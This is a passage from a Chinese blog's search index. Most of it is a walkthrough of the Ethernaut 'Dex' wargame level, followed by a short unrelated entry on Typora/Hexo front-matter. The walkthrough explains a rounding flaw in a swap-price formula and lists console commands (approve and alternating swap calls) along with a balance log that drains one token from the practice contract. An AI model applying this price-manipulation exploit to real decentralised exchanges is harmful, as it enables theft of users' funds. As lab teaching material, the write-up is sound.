exchange(DEX)</a></li><li><a href="https://medium.com/ethex-market/erc20-approve-allow-explained-88d6de921ce9">ERC20 批准/允许解释</a></li><li><a href="https://ethereum.stackexchange.com/a/92523/71430">ERC20 Token之间如何“交换”？</a></li></ol><p>我们的目的是让一个TKN成为0，在<a href="https://github.com/OpenZeppelin/ethernaut/pull/204/commits/f9cc723d39157acc3f806736ec28a614197cfe51">官网</a>上也可以看到过关条件<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730032305005.png"></p><p>若对**IERC20.sol ** <strong>ERC20.sol</strong>还不是很了解的话可以参考：</p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol"><strong>IERC20.sol</strong></a></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol"><strong>ERC20.sol</strong></a></p><p>回到题目，我们重点需要看这个函数：</p><pre><code>function get_swap_price(address from, address to, uint amount) public view returns(uint){    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));}</code></pre><p>两种Token的合约初始余额均为 100。 利用<code>get_swap_price()</code>计算合约的Token剩余的值。</p><pre><code>(amount *IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))</code></pre><p>这将返回相同的交换价格，即 10 个 token1 可以交换 10 个 token2。要破解此方法，必须打破合约代币余额的平衡。须执行以下步骤以产生更高的互换价格</p><ul><li>调用<code>approve()</code>函数授权使用token1余额<pre><code>await contract.approve(instance,Number((await contract.balanceOf(token1address, instance)).toString()))</code></pre></li><li>调用<code>approve()</code>函数授权使用token2的余额</li></ul><pre><code>await contract.approve(instance,Number((await contract.balanceOf(token2address, instance)).toString()))</code></pre><ul><li>调用<code>swap()</code>函数进行交换<pre><code>await contract.swap(token1address,token2address,Number((await contract.balanceOf(token1address, player)).toString()))</code></pre></li><li>调用<code>swap()</code>函数进行交换<pre><code>await contract.swap(token2address,token1address,Number((await contract.balanceOf(token2address, player)).toString()))</code></pre></li><li>现在，token2中的余额是0，token1中的余额是20，利用swap()函数中的<code>get_swap_price()</code>，让他可以用20个token1来交换24个token2,</li><li>重复这些步骤，直到将任一代币的合约余额减少到 0。<br>（注意：您可能会收到此错误<code>ERC20: transfer amount exceeds balance</code>。这是因为合约没有足够的余额用于请求的TKN。可以减少互换金额来处理此问题）</li></ul><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取新实例</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730023656801.png">2、先熟悉我们部署合约的地址<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730023905938.png"></p><p>3、分析合约，了解合约内容，发现合约所需要用到的token地址我们并不知道。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730030401831.png"></p><p>4、结合题目，判断Token地址在部署的时候应该会随之存在，于是我们进入钱包找到刚才的合约，进入etherscan中查找我们所需要的内容</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730030726143.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730031251299.png"></p><p>右键，将这两个TKN分别在新标签页打开，拿到我们所需要的值<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730031350910.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730031651090.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730031802867.png"></p><p>整理一下，我们现在得到了五个地址给我们备用，加上后面我们可能会用到语句，我将他们先放到此处：</p><pre><code>player'0x34DC7d4F5E3512B66271Ce64198c20DFD8B53897'instance'0xc177418226c51f09E284A91eD20F293CEAce8772'Contract '0xd991431d8b033ddcb84dad257f4821e9d5b38c33'Token 1'0xe1f647e443710dde0ed501cdb204b59351c13a37'Token 2'0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6'Token 1 balanceOfawait contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37',instance或player)//instance和player选择一个Token 2 balanceOfawait contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',instance或player)Token 1 approveawait contract.approve(instance,Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37', instance)).toString()))from Token 2 to Token 1 swapawait contract.swap('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','0xe1f647e443710dde0ed501cdb204b59351c13a37',Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6', instance或player)).toString()))from Token 1 to Token 2 swapawait contract.swap('0xe1f647e443710dde0ed501cdb204b59351c13a37','0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37', instance或player)).toString()))get_swap_priceawait contract.get_swap_price('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','0xe1f647e443710dde0ed501cdb204b59351c13a37',Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6', instance)).toString()))查看四个值await [Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37',instance)).toString()),Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',instance)).toString()),Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37',player)).toString()),Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',player)).toString())]TKN 1-&gt;TKN 2await contract.swap('0xe1f647e443710dde0ed501cdb204b59351c13a37','0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37',player)).toString()))await contract.swap('0xe1f647e443710dde0ed501cdb204b59351c13a37','0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','20')TKN 2-&gt;TKN 1await contract.swap('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','0xe1f647e443710dde0ed501cdb204b59351c13a37',Number((await contract.balanceOf('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6',player)).toString()))await contract.swap('0x6e4ec7bcb41e0bb6156b78ca86253ce800af8ec6','0xe1f647e443710dde0ed501cdb204b59351c13a37','20')当然也可以赋值给TKN1_address这种，好方法都可以</code></pre><p>5、准备好了我们开始吧，先查看一下四个的值并记录下来</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730034149798.png"></p><pre><code>Start price manipulating...//最开始:TKN1/DEX：合约中的TKN1，TKN2/DEX：合约中的TKN2，TKN1/PLAYER：玩家的TKN1,TKN2/PLAYER：玩家的TKN2Balances: TKN1/DEX - 100, TKN2/DEX - 100, TKN1/PLAYER - 10, TKN2/PLAYER - 10Swap price: TKN2 -&gt; TKN1       - '10'Balances: TKN1/DEX - 90, TKN2/DEX - 110, TKN1/PLAYER - 20, TKN2/PLAYER - 0Swap price: TKN1 -&gt; TKN2       - '20'Balances: TKN1/DEX - 110, TKN2/DEX - 86, TKN1/PLAYER - 0, TKN2/PLAYER - 24Swap price: TKN2 -&gt; TKN1       - '24'Balances: TKN1/DEX - 80, TKN2/DEX - 110, TKN1/PLAYER - 30, TKN2/PLAYER - 0Swap price: TKN1 -&gt; TKN2       - '30'Balances: TKN1/DEX - 110, TKN2/DEX - 69, TKN1/PLAYER - 0, TKN2/PLAYER - 41Swap price: TKN2 -&gt; TKN1       - '41'Balances: TKN1/DEX - 45, TKN2/DEX - 110, TKN1/PLAYER - 65, TKN2/PLAYER - 0Swap price: TKN1 -&gt; TKN2       - ’‘Balances: TKN1/DEX - 90, TKN2/DEX - 0, TKN1/PLAYER - 20, TKN2/PLAYER - 110Swap price: TKN2 -&gt; TKN1       - ’‘Balances: TKN1/DEX - 90, TKN2/DEX - 0, TKN1/PLAYER - 20, TKN2/PLAYER - 110</code></pre><p>6、我们先让TKN1和TKN2进行授权，意思是让合约能够操作110的TKN就可以了</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730035631607.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730035318313.png"></p><p>7、我们先让TKN2先与TKN1进行交换，将TKN2/PLAYER - 10全部交换出去，注意对照swap()中的地址，TKN的DEX地址对应TKN的address(this),TKN的PLAYER地址对应的是TKN的msg.sender地址，判断条件是判断的from地址中msg.sender(player)的TKN的的值是否大于amount。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730035928760.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730040238280.png"></p><p>交换成功，四个值都对应的改变了，我们做好记录：</p><p>为满足下一个判断条件，我们需要将TKN1先与TKN2进行交换并记录下来（这里需要注意先后顺序，满足判断条件）</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730041002311.png"></p><p>继续上述步骤，将TKN2先与TKN1进行交换并记录：<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730041301845.png"></p><p>再继续，将TKN1先与TKN2进行交换并记录：<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730041506134.png"></p><p>接着继续，将TKN2先与TKN1进行交换并记录：</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730041746519.png"></p><p>再继续试试看，将TKN1先与TKN2进行交换并记录：</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730041849162.png"></p><p>没错，这里就是题目所提到的错误，我们先拒绝掉这个请求，这里是因为合约没有足够的余额去请求的TKN。可以减少互换金额来处理此问题</p><p>7、现在轮到TKN1去跟TKN2交换了，于是我们要满足swap的判断条件，测试用最大的一个数值就行，可以分析判断，因为最开始我们是直接向合约请求的110的授权，所以这里45是刚好满足条件的，如果之前使用的是如下代码，授权的是100，也没关系，可以手动输入测试一下，很快就能够找到最大的一个值了，总之，因为我们使用的是除，类型使用的uint，多试几次绝对能够让一个TKN/DEX变成0，</p><pre><code>Token 1 approveawait contract.approve(instance,Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37', instance)).toString()))</code></pre><p>我们使用最快的办法<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730043123160.png"></p><p>这时候发现TKN2/DEX变成0了，我们就成功了呀！</p><p>8、快乐提交吧！这类Ethernaut闯关后面还会持续优化一些细节，<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730043724693.png"></p><p>有需要的铁子们可以分享给需要的人，哦，对了，铁铁们记得点赞关注投币，一键三连呀！</p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora Theme主题介绍</title>
      <link href="//Markdown/Markdown/typora%20theme%E4%B8%BB%E9%A2%98%E4%BB%8B%E7%BB%8D/"/>
      <url>//Markdown/Markdown/typora%20theme%E4%B8%BB%E9%A2%98%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p>Front-matter 选项详解<br>Front-matter 选项中的所有内容均为非必填的。但我仍然建议至少填写 title 和 date 的值。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210802195444482.png"><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210802195502305.png"></p><p>注意:</p><ol><li>如果 img 属性不填写的话，文章特色图会根据文章标题的 hashcode 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图各有特色。</li><li>date 的值尽量保证每篇文章是唯一的，因为本主题中 Gitalk 和 Gitment 识别 id 是通过 date 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 _config.yml 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：开源中国在线工具、chahuo、站长工具。</li><li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li></ol><p>以下为文章的 Front-matter 示例。</p>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Typora </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
